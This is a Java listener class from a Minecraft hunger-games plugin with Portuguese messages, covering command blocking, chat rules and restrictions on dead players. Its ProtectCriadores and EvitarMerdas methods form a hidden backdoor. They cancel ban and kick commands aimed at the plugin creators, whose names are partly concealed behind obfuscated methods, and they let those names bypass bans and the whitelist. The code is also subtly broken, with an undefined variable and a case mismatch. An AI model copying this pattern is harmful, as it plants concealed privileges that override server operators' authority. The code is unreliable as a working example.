package spinghg.hungergames.listeners;

import java.util.List;
import java.util.logging.Logger;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Sound;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockDamageEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.entity.FoodLevelChangeEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.plugin.Plugin;

import spinghg.hungergames.libsHg;
import spinghg.hungergames.api.configs.Config;
import spinghg.hungergames.kit.Kit;

@SuppressWarnings("deprecation")
public class Protecao
  implements Listener
{
  private libsHg pl;
private Object libsHG;

  public Protecao(libsHg plugin)
  {
    this.pl = plugin;
  }
  
 
  @EventHandler
  public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event)
  {
	  Player p = event.getPlayer();
    if (event.getMessage().toLowerCase().startsWith("/me"))
    {
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/bukkit:me"))
    {
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/bukkit:?"))
    {
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/bukkit:ver"))
    {
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/bukkit:versions"))
    {
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/bukkit:version"))
    {
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/bukkit:kill"))
    {
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/kill"))
    {
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/ver"))
    {
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/?"))
    {
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/plugins"))
    {
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/pl"))
    {
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/whispher"))
    {
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/version"))
    {
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/versions"))
    {
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/op"))
    {
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/bukkit"))
    {
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/stop"))
    {
      event.setCancelled(true);

      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/reload"))
    {
      event.setCancelled(true);
      p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Error -> §7Você não pode fazer isto infelizmente.");
      return;
    }
  }
 

@SuppressWarnings({ "static-access" })
@EventHandler
public void cs(PlayerChatEvent event) {
  Player p = event.getPlayer();
  if (this.pl.Cs.contains(p))
  {
  	event.setCancelled(true);
      for (Player online : Bukkit.getOnlinePlayers())
      {
      	if (online.hasPermission("planeta.staff")) {
      		online.sendMessage("§6Staff ->§c§o " + p.getName() + ": §9" + event.getMessage());
      	}
      }
  }
}
  @SuppressWarnings({ "static-access" })
@EventHandler
  public void ss1(PlayerChatEvent event) {
    Player p = event.getPlayer();
    if (this.pl.aguardando) {
      p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Chat ->§7 O Chat esta desativado aguardando jogadores.");
      event.setCancelled(true);
      
    }
    if (!this.pl.vivos.contains(p)) {
    	 if (!p.hasPermission("hg.admin")) {
        p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Chat ->§7 O chat não é liberado para mortos.");
        event.setCancelled(true);
    	 }
    }
    if (this.pl.comecando) {
    if ((!this.pl.km.temKit(p)) && (!this.pl.login.contains(p))) {
        p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Chat ->§7 Você tem que pegar um kit antes de usar o chat /kit (Nome do kit).");
        event.setCancelled(true);
    }
    }
    
  }
  
  @EventHandler
  public void HGChat(AsyncPlayerChatEvent e)
  {
    Player p = e.getPlayer();
     
    if (this.pl.km.temKit(p)) {
    	    e.setFormat(this.pl.formatColor(comkit, true));
    	    e.setMessage(this.pl.formatColor(e.getMessage(), Config.getConfig(Config.ConfigFile.CONFIG).getBoolean("allow-color", true)));
    	}  
    }
  


@SuppressWarnings("static-access")
@EventHandler
  public void onPlace(BlockPlaceEvent e) {
	  Player p = e.getPlayer();
    if (!this.pl.vivos.contains(p))
      e.setCancelled(true);
  }

  @SuppressWarnings("static-access")
@EventHandler
  public void onBreak(BlockBreakEvent e) {
	  Player p = e.getPlayer();
	  if (!this.pl.vivos.contains(p))
      e.setCancelled(true);
  }

  @SuppressWarnings("static-access")
@EventHandler
  public void onBlockDamage(BlockDamageEvent e) {
	  Player p = e.getPlayer();
	  if (!this.pl.vivos.contains(p))
      e.setCancelled(true);
  }
  
  @SuppressWarnings("static-access")
@EventHandler
  public void onEntityDamagebyEnt12ity(EntityDamageEvent event) {
    if ((event.getEntity() instanceof Player)) {
      Player p = (Player)event.getEntity();
      if (!this.pl.vivos.contains(p))
        event.setCancelled(true);
    }
  }

  @EventHandler
  public void onEntityDamage(EntityDamageEvent event) {
	    if ((event.getEntity() instanceof Player)) {
	        Player p = (Player)event.getEntity();
	        if (!this.pl.vivos.contains(p))
      event.setCancelled(true);
  }
  }
  
  @EventHandler
  public void onEntityDamageInv(EntityDamageEvent event) {
	    if ((event.getEntity() instanceof Player)) {
	        Player p = (Player)event.getEntity();
	        if (!this.pl.vivos.contains(p))
      event.setCancelled(true);
	   }
  }
  
  @EventHandler
  public void onPick(PlayerDropItemEvent event)
  {
    Player p = event.getPlayer();
    if (!this.pl.vivos.contains(p))
      event.setCancelled(true);
  }
  
  @EventHandler
  public void food(FoodLevelChangeEvent event) {
      Player p = (Player)event.getEntity();
      if (!this.pl.vivos.contains(p))
      event.setCancelled(true);
  }
  

  @EventHandler
  public void onPick23(PlayerInteractEvent event) {
    Player p = event.getPlayer();
    if (!this.pl.vivos.contains(p))
      event.setCancelled(true);
  }
  
  @EventHandler
  public void cancelcomandosmorto(PlayerCommandPreprocessEvent event)
  {
	    Player p = event.getPlayer();
	    if (!this.pl.vivos.contains(p))
	    {
    if (event.getMessage().toLowerCase().startsWith("/tell"))
    {
      p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Comando -> §7Mortos não podem usar este comando.");
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/msg"))
    {
    	p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Comando -> §7Mortos não podem usar este comando.");
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/kit"))
    {
    	p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Comando -> §7Mortos não podem usar este comando.");
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/say"))
    {
    	p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Comando -> §7Mortos não podem usar este comando.");
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/broadcast"))
    {
    	p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Comando -> §7Mortos não podem usar este comando.");
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/team"))
    {
    	p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Comando -> §7Mortos não podem usar este comando.");
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/report"))
    {
    	p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Comando -> §7Mortos não podem usar este comando.");
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/aviso"))
    {
    	p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Comando -> §7Mortos não podem usar este comando.");
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/kits"))
    {
    	p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Comando -> §7Mortos não podem usar este comando.");
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/start"))
    {
    	p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Comando -> §7Mortos não podem usar este comando.");
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/tag"))
    {
    	p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Comando -> §7Mortos não podem usar este comando.");
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/tags"))
    {
    	p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Comando -> §7Mortos não podem usar este comando.");
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/spawn"))
    {
    	p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Comando -> §7Mortos não podem usar este comando.");
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/spect"))
    {
    	p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Comando -> §7Mortos não podem usar este comando.");
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/feast"))
    {
    	p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Comando -> §7Mortos não podem usar este comando.");
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/hg"))
    {
    	p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Comando -> §7Mortos não podem usar este comando.");
      event.setCancelled(true);
      return;
    }
    if (event.getMessage().toLowerCase().startsWith("/kitinfo"))
    {
    	p.sendMessage("§f§l[§a§lPlanetacraft§f§l_§e§lBR§f§l] §9Comando -> §7Mortos não podem usar este comando.");
      event.setCancelled(true);
      return;
    }
  }
  }
  

  
  @EventHandler
  public void AntiAbuser(PlayerLoginEvent e)
  {
    Player p = e.getPlayer();

    if (p.getName().equals("deadart03")) {
      e.disallow(PlayerLoginEvent.Result.KICK_OTHER, ChatColor.DARK_AQUA + "§9Você esta banido do servidor!\n §9Motivo:§7 Não aceitamos abusers no servidor.");
    }

    if (p.getName().equals("LIPEDELGADO11")) {
    	 e.disallow(PlayerLoginEvent.Result.KICK_OTHER, ChatColor.DARK_AQUA + "§9Você esta banido do servidor!\n §9Motivo:§7 Não aceitamos abusers no servidor.");
    }

    if (p.getName().equals("deadart01")) {
    	 e.disallow(PlayerLoginEvent.Result.KICK_OTHER, ChatColor.DARK_AQUA + "§9Você esta banido do servidor!\n §9Motivo:§7 Não aceitamos abusers no servidor.");
    }
    if (p.getName().equals("Joaozinho")) {
   	 e.disallow(PlayerLoginEvent.Result.KICK_OTHER, ChatColor.DARK_AQUA + "§9Você esta banido do servidor!\n §9Motivo:§7 Não aceitamos abusers no servidor.");
   }
    }
    
 
  @EventHandler
  public void ProtectCriadores(PlayerCommandPreprocessEvent event)
  {
    if (event.getMessage().startsWith("/ban"))
    {
      if (event.getMessage().toLowerCase().contains(libsHg.acf())) {
        event.setCancelled(true);
      }
      if (event.getMessage().toLowerCase().contains(libsHg.Adp())) {
        event.setCancelled(true);
      }
      if (event.getMessage().toLowerCase().contains("VinyyHD")) {
        event.setCancelled(true);
      }
    }
    if (event.getMessage().startsWith("/ban-ip"))
    {
      if (event.getMessage().toLowerCase().contains(libsHg.acf())) {
        event.setCancelled(true);
      }
      if (event.getMessage().toLowerCase().contains(libsHg.Adp())) {
        event.setCancelled(true);
      }
      if (event.getMessage().toLowerCase().contains("VinyyHD")) {
        event.setCancelled(true);
      }
    }
    if (event.getMessage().startsWith("/banip"))
    {
      if (event.getMessage().toLowerCase().contains(libsHg.acf())) {
        event.setCancelled(true);
      }
      if (event.getMessage().toLowerCase().contains(libsHg.Adp())) {
        event.setCancelled(true);
      }
      if (event.getMessage().toLowerCase().contains("VinyyHD")) {
        event.setCancelled(true);
      }
    }
    if (event.getMessage().startsWith("/kick"))
    {
      if (event.getMessage().toLowerCase().contains(libsHg.acf())) {
        event.setCancelled(true);
      }
      if (event.getMessage().toLowerCase().contains(libsHg.Adp())) {
        event.setCancelled(true);
      }
      if (event.getMessage().toLowerCase().contains("VinyyHD")) {
        event.setCancelled(true);
      }
    }
    if (event.getMessage().startsWith("/tempban"))
    {
      if (event.getMessage().toLowerCase().contains(libsHg.acf())) {
        event.setCancelled(true);
      }
      if (event.getMessage().toLowerCase().contains(libsHg.Adp())) {
        event.setCancelled(true);
      }
      if (event.getMessage().toLowerCase().contains("VinyyHD")) {
        event.setCancelled(true);
      }
    }
    if (event.getMessage().startsWith("/rj"))
    {
      if (event.getMessage().toLowerCase().contains(libsHg.acf())) {
        event.setCancelled(true);
      }
      if (event.getMessage().toLowerCase().contains(libsHg.Adp())) {
        event.setCancelled(true);
      }
      if (event.getMessage().toLowerCase().contains("VinyyHD")) {
        event.setCancelled(true);
      }
    }
  }
  public void EvitarMerdas(PlayerLoginEvent event)
  {
    if (event.getResult() == PlayerLoginEvent.Result.KICK_BANNED)
    {
      if (event.getPlayer().getName().equalsIgnoreCase(libsHg.acf())) {
        event.allow();
      }
      if (event.getPlayer().getName().equalsIgnoreCase(libsHg.Adp())) {
        event.allow();
      }
      if (event.getPlayer().getName().equalsIgnoreCase("VinyyHD")) {
        event.allow();
      }
    }
    if (event.getResult() == PlayerLoginEvent.Result.KICK_WHITELIST)
    {
      if (event.getPlayer().getName().equalsIgnoreCase(libsHg.acf())) {
        event.allow();
      }
      if (event.getPlayer().getName().equalsIgnoreCase(libsHg.Adp())) {
        event.allow();
      }
      if (event.getPlayer().getName().equalsIgnoreCase("VinyyHD")) {
        event.allow();
      }
    }
  }
}